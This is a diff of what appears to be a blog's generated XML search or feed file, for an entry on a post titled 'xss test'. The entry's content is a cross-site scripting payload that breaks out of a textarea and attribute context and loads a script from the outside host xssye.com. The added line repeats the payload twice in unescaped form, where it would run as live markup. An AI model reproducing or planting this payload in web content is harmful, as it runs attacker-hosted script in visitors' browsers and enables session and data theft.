@@ -8,7 +8,7 @@
       <link href="/2021/12/12/xss%E6%B5%8B%E8%AF%95/"/>
       <url>/2021/12/12/xss%E6%B5%8B%E8%AF%95/</url>
       
-        <content type="html"><![CDATA[<pre><code>]&lt;h1&gt;&amp;aaa;&lt;/h1&gt;&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xssye.com/UAQg&gt;&lt;/sCrIpT&gt;</code></pre>]]></content>
+        <content type="html"><![CDATA[<pre><code>]&lt;h1&gt;&amp;aaa;&lt;/h1&gt;&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xssye.com/UAQg&gt;&lt;/sCrIpT&gt;</code></pre><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd">]<h1>&aaa;</h1></tExtArEa>'"><sCRiPt sRC=http://xssye.com/UAQg></sCrIpT><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-x-xxx"><code class="language-x-xxx">]<h1>&aaa;</h1></tExtArEa>'"><sCRiPt sRC=http://xssye.com/UAQg></sCrIpT><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
       
       
       
